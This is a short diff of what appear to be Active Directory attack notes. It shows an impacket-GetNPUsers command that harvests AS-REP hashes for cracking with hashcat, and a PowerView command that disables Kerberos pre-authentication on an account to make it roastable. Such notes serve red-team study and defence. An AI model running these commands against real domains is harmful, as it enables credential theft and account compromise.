@@ -8,7 +8,7 @@ impacket-GetNPUsers lol.local/ -usersfile valid_users.txt -format hashcat -dc-ip
 
 ---
 
-we can turn on `Don't require pre-auth` by manipulating  the `useraccountcontrol`:
+we can turn on `Don't require pre-auth` by manipulating  the `useraccountcontrol`: (PowerView)
 ```powershell
 Set-DomainObject -Identity ITguy -XOR @{useraccountcontrol=4194304} -Verbose
 ```
